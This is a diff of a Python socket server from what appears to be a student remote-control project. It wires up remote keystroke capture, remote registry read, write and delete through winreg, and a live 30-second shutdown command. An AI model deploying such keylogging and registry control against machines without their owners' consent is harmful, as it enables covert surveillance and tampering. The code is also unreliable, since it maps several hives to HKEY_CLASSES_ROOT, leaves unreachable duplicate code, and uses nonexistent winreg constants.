@@ -193,11 +193,11 @@ def keystroke(Client_socket):
 			key = key.replace("'","")
 			if key == "Key.enter":
 				key = "\n"
-			if key == "Key.space":
+			elif key == "Key.space":
 				key = " "
-			if key == "Key.tab":
+			elif key == "Key.tab":
 				key = "\t"
-			if key == "Key.backspace":
+			elif key == "Key.backspace":
 				key = "\b"
 			text += str(key)
 			print(text)
@@ -238,16 +238,12 @@ def keystroke(Client_socket):
 
 def edit_registry(Client_socket):
 	while True:
-		print('do edit registry')
 		Code = Client_socket.recv(1).decode("utf8")
 
 		if (Code == CONTENT):
-			# s : data
-			print("bat dau")
 			s = Client_socket.recv(5000).decode("utf8")
 			Client_socket.sendall(bytes('1', 'utf8'))
 
-			print("nhan oke")
 			fileReg = open('fileReg.reg', 'w')
 			fileReg.write(s)
 			fileReg.close()
@@ -264,108 +260,75 @@ def edit_registry(Client_socket):
 				# sua that bai
 				Client_socket.sendall(bytes('0', 'utf8'))
 			Client_socket.recv(1).decode('utf8')
+
 		elif (Code == QUIT):
 			return
+
 		elif (Code == EDIT):
-			print("start")
+			# get value of client
 			option = Client_socket.recv(100).decode('utf8')
 			Client_socket.sendall(bytes("1", "utf8"))
-			print(option)
 
 			link = Client_socket.recv(100).decode('utf8')
 			Client_socket.sendall(bytes("1", "utf8"))
-			print(link)
-
+			
 			valueName = Client_socket.recv(100).decode('utf8')
 			Client_socket.sendall(bytes("1", "utf8"))
-			print(valueName)
-
+			
 			value = Client_socket.recv(100).decode('utf8')
 			Client_socket.sendall(bytes("1", "utf8"))
-			print(value)
-
+			
 			typeValue = Client_socket.recv(100).decode('utf8')
 			Client_socket.sendall(bytes("1", "utf8"))
-			print(typeValue)
 
-			s = 'error'
+			s = 'error'			
 
-			# xu li link
-			if 'HKEY_CURRENT_USER' in link:
-				hkey = winreg.HKEY_CURRENT_USER
-				sub_key = link[18:]
-			elif 'HKEY_CLASSES_ROOT' in link:
-				hkey = winreg.HKEY_CLASSES_ROOT
-				sub_key = link[18:]
-			elif 'HKEY_LOCAL_MACHINE' in link:
-				hkey = winreg.HKEY_CLASSES_ROOT
-				sub_key = link[19:]
-			elif 'HKEY_USER' in link:
-				hkey = winreg.HKEY_CLASSES_ROOT
-				sub_key = link[10:]
-			elif 'HKEY_CURRENT_CONFIG' in link:
-				hkey = winreg.HKEY_CLASSES_ROOT
-				sub_key = link[20:]
+			try:
+				# xu li link
+				if 'HKEY_CURRENT_USER' in link:
+					hkey = winreg.HKEY_CURRENT_USER
+					sub_key = link[18:]
+				elif 'HKEY_CLASSES_ROOT' in link:
+					hkey = winreg.HKEY_CLASSES_ROOT
+					sub_key = link[18:]
+				elif 'HKEY_LOCAL_MACHINE' in link:
+					hkey = winreg.HKEY_CLASSES_ROOT
+					sub_key = link[19:]
+				elif 'HKEY_USER' in link:
+					hkey = winreg.HKEY_CLASSES_ROOT
+					sub_key = link[10:]
+				elif 'HKEY_CURRENT_CONFIG' in link:
+					hkey = winreg.HKEY_CLASSES_ROOT
+					sub_key = link[20:]
 
-			print("do ne!!")
-			
 
-			if (option == 'Get value'):
-				key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
-				s = winreg.QueryValueEx(key, valueName)[0]
-				winreg.CloseKey(key)
-			elif (option == 'Set value'):
-				key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
-				print(1)
-				type_value = ReturnWirg(typeValue)
-				print(2)
-				winreg.SetValue(key, valueName, type_value, value)
-				print(3)
-				s = 'oke'
-				winreg.CloseKey(key)
-			elif (option == 'Delete value'):
-				key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
-				winreg.DeleteValue(key, valueName)
-				s = 'oke'
-				winreg.CloseKey(key)
-			elif (option == 'Create key'):
-				print(1)
-				key1 = winreg.ConnectRegistry(None, hkey)
-				print(2)
-				winreg.CreateKey(key1, sub_key)
-				s = 'oke'
-			elif (option == 'Delete key'):
-				key1 = winreg.ConnectRegistry(None, hkey)
-				winreg.DeleteKey(key1, sub_key)
-				s = 'oke'
-				winreg.CloseKey(key1)
+				if (option == 'Get value'):
+					key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
+					s = winreg.QueryValueEx(key, valueName)[0]
+					winreg.CloseKey(key)
+				elif (option == 'Set value'):
+					key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
+					type_value = ReturnWirg(typeValue)
+					winreg.SetValueEx(key, valueName, 0, type_value, value)
+					s = 'oke'
+					winreg.CloseKey(key)
+				elif (option == 'Delete value'):
+					key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
+					winreg.DeleteValue(key, valueName)
+					s = 'oke'
+					winreg.CloseKey(key)
+				elif (option == 'Create key'):
+					key1 = winreg.ConnectRegistry(None, hkey)
+					winreg.CreateKey(key1, sub_key)
+					s = 'oke'
+				elif (option == 'Delete key'):
+					key1 = winreg.ConnectRegistry(None, hkey)
+					winreg.DeleteKey(key1, sub_key)
+					s = 'oke'
+					winreg.CloseKey(key1)
+			except:
+				s = 'error'
 
-			# try:
-			# 	if (option == 'Get value'):
-			# 		s = winreg.QueryValueEx(key, valueName)[0]
-			# 	elif (option == 'Set value'):
-			# 		type_value = ReturnWirg(typeValue)
-			# 		winreg.SetValue(key, name, type_value, value)
-			# 		s = 'oke'
-			# 	elif (option == 'Delete value'):
-			# 		winreg.DeleteValue(key, valueName)
-			# 		s = 'oke'
-			# 	elif (option == 'Create key'):
-			# 		key1 = winreg.ConnectRegistry(None, hkey)
-			# 		winreg.CreateKey(key1, sub_key)
-			# 		s = 'oke'
-			# 		winreg.CloseKey(key1)
-			# 	elif (optin == 'Delete key'):
-			# 		key1 = winreg.ConnectRegistry(None, hkey)
-			# 		winreg.DeleteKey(key1, sub_key)
-			# 		s = 'oke'
-			# 		winreg.CloseKey(key1)
-			# except:
-			# 	s = 'error'
-			# 	print('loi')
-			# finally:
-			# 	winreg.CloseKey(key)
-			print(s)
 			Client_socket.sendall(bytes(s, 'utf8'))
 			tempt = Client_socket.recv(1).decode('utf8')
 
@@ -384,12 +347,27 @@ def ReturnWirg(name):
 	if (name == 'Expandable String'):
 		return winreg.EXPAND_SZ
 	return None
+	if (name == 'String'):
+		return winreg.REG_SZ
+	if (name == 'Binary'):
+		return winreg.BINARY
+	if (name == 'DWORD'):
+		return winreg.DWORD
+	if (name == 'QWORD'):
+		return winreg.QWORD
+	if (name == 'Multi-String'):
+		return winreg.MULTI_SZ
+	if (name == 'Expandable String'):
+		return winreg.EXPAND_SZ
+	return None
 
 
 
 def Shutdown_Computer():
 	print('shutdown')
-	# system("shutdown /s /t 30")
+
+	# Shutdown after 30 seconds
+	system("shutdown /s /t 30")
 
 def accept_incoming_connection():
 	while True:
@@ -432,7 +410,7 @@ def Run(Client_socket,Client_add):
 				keystroke(Client_socket)
 			#Edit_Register
 			if (Code == EDIT_REGISTRY):
-				a = 1
+				edit_registry(Client_socket)
 			#Exit
 			if (Code == EXIT):
 				Client_socket.close()
